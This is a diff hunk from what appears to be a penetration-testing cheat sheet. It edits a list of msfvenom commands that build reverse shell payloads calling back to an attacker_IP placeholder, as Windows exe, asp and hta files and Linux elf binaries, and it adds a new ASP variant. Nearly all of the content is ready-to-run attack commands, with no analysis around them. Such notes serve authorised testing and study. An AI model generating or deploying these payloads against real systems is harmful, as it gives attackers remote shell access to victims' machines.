@@ -1944,19 +1944,22 @@ cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/pa
 # list available payloads
 msfvenom --list payloads
 
-# create Windows TCP reverse shell exe - 64-bit
+# create Windows TCP reverse shell exe - 64-bit (unstaged)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
 
-# create Windows TCP reverse shell exe - 32-bit
+# create Windows TCP reverse shell exe - 32-bit (unstaged)
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
 
-# create Windows TCP reverse shell hta
+# create Windows TCP reverse shell asp (unstaged)
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f asp -o revshell.asp
+
+# create Windows TCP reverse shell hta (unstaged)
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-psh -o revshell.hta
 
-# create Linux TCP reverse shell elf - 64-bit
+# create Linux TCP reverse shell elf - 64-bit (unstaged)
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x64 -o shell.elf
 
-# create Linux TCP reverse shell elf - 32-bit
+# create Linux TCP reverse shell elf - 32-bit (unstaged)
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x86 -o shell.elf
 ```
 
